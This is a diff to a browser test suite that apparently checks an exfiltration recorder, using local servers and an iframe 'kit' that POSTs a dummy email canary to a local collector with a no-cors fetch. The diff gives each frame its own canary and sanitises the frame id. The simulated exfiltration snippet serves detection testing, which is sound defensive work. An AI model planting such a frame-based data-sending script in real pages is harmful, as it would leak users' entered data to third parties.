@@ -24,7 +24,17 @@ let pageOrigin: string;
 let kitOrigin: string;
 let browser: Browser | undefined;
 
-const KIT_CANARY = "email=cross-site-frame-canary";
+/** The body a kit frame sends; unique per frame id so tests cannot match each other's traffic. */
+function kitCanary(frame: string): string {
+	return `email=cross-site-frame-canary-${frame}`;
+}
+
+/**
+ * The first-run test waits up to 10 s for its canary. Bun's default per-test
+ * timeout is 5 s, which the runner would hit before that wait decides, so this
+ * test gets a limit that covers the wait plus the setup around it.
+ */
+const FIRST_RUN_TEST_TIMEOUT_MS = 15_000;
 
 beforeAll(async () => {
 	if (!chromiumAvailable) return;
@@ -36,17 +46,25 @@ beforeAll(async () => {
 	});
 	await new Promise<void>((resolve) => collector.listen(0, "127.0.0.1", resolve));
 	collectorOrigin = `http://127.0.0.1:${(collector.address() as AddressInfo).port}`;
-	// The kit frame sends the canary as soon as it runs; the probe's later drive sends after attach.
-	const kitHtml = `<!doctype html><html><body><script>
-		window.sendCanary = () => fetch("${collectorOrigin}/collect", { method: "POST", body: "${KIT_CANARY}", mode: "no-cors" });
+	// The kit frame sends its canary as soon as it runs; the probe's later drive sends after attach.
+	// Each frame's canary is derived from its own URL, so a match can only come from that frame.
+	// Sharing one canary across tests let an earlier test's kit frame satisfy a later assertion.
+	kitServer = createServer((request, response) => {
+		const requested = new URL(request.url ?? "/", "http://localhost").searchParams.get("frame") ?? "default";
+		// The id is placed inside a script string, so only a plain token is accepted.
+		const frame = /^[a-z]+$/.test(requested) ? requested : "default";
+		const canary = kitCanary(frame);
+		response.setHeader("content-type", "text/html");
+		response.end(`<!doctype html><html><body><script>
+		window.sendCanary = () => fetch("${collectorOrigin}/collect", { method: "POST", body: "${canary}", mode: "no-cors" });
 		window.sendCanary();
-	</script></body></html>`;
-	kitServer = createServer((request, response) => { response.setHeader("content-type", "text/html"); response.end(kitHtml); });
+	</script></body></html>`);
+	});
 	await new Promise<void>((resolve) => kitServer.listen(0, "localhost", resolve));
 	kitOrigin = `http://localhost:${(kitServer.address() as AddressInfo).port}`;
 	pageServer = createServer((request, response) => {
 		response.setHeader("content-type", "text/html");
-		response.end(`<!doctype html><html><body><h1>loader</h1><iframe src="${kitOrigin}/kit" width="300" height="200"></iframe></body></html>`);
+		response.end(`<!doctype html><html><body><h1>loader</h1><iframe src="${kitOrigin}/kit?frame=existing" width="300" height="200"></iframe></body></html>`);
 	});
 	await new Promise<void>((resolve) => pageServer.listen(0, "127.0.0.1", resolve));
 	pageOrigin = `http://127.0.0.1:${(pageServer.address() as AddressInfo).port}`;
@@ -71,7 +89,7 @@ describe.skipIf(!chromiumAvailable)("exfiltration recorder against real Chrome",
 		await new Promise((resolve) => setTimeout(resolve, 1_000));
 		const captured = await recorder.stop();
 		expect(captured).toEqual(expect.arrayContaining([
-			expect.objectContaining({ url: `${collectorOrigin}/collect`, method: "POST", postData: KIT_CANARY }),
+			expect.objectContaining({ url: `${collectorOrigin}/collect`, method: "POST", postData: kitCanary("existing") }),
 		]));
 		await page.close();
 	});
@@ -85,14 +103,14 @@ describe.skipIf(!chromiumAvailable)("exfiltration recorder against real Chrome",
 			const frame = document.createElement("iframe");
 			frame.src = url;
 			document.body.appendChild(frame);
-		}, `${kitOrigin}/kit?late=1`);
+		}, `${kitOrigin}/kit?frame=late`);
 		await new Promise((resolve) => setTimeout(resolve, 1_500));
-		const kitFrame = page.frames().find((frame) => frame.url().includes("late=1"));
+		const kitFrame = page.frames().find((frame) => frame.url().includes("frame=late"));
 		expect(kitFrame).toBeDefined();
 		await kitFrame!.evaluate(() => (window as unknown as { sendCanary: () => Promise<unknown> }).sendCanary());
 		await new Promise((resolve) => setTimeout(resolve, 1_000));
 		const captured = await recorder.stop();
-		expect(captured.some((request) => request.postData === KIT_CANARY)).toBeTrue();
+		expect(captured.some((request) => request.postData === kitCanary("late"))).toBeTrue();
 		await page.close();
 	});
 
@@ -108,14 +126,15 @@ describe.skipIf(!chromiumAvailable)("exfiltration recorder against real Chrome",
 			const frame = document.createElement("iframe");
 			frame.src = url;
 			document.body.appendChild(frame);
-		}, `${kitOrigin}/kit?firstrun=1`);
+		}, `${kitOrigin}/kit?frame=firstrun`);
 		// Wait for the canary the frame sends, up to a bounded deadline, rather than a fixed
 		// sleep: a slow frame under load then passes, and a genuinely lost send still fails.
-		const canaryCaptured = () => recorder.snapshot().some((request) => request.postData === KIT_CANARY && request.url.includes("/collect"));
+		const expectedCanary = kitCanary("firstrun");
+		const canaryCaptured = () => recorder.snapshot().some((request) => request.postData === expectedCanary && request.url.includes("/collect"));
 		const deadline = Date.now() + 10_000;
 		while (!canaryCaptured() && Date.now() < deadline) await new Promise((resolve) => setTimeout(resolve, 100));
 		const captured = await recorder.stop();
-		expect(captured.some((request) => request.postData === KIT_CANARY && request.url.includes("/collect"))).toBeTrue();
+		expect(captured.some((request) => request.postData === expectedCanary && request.url.includes("/collect"))).toBeTrue();
 		await page.close();
-	});
+	}, FIRST_RUN_TEST_TIMEOUT_MS);
 });
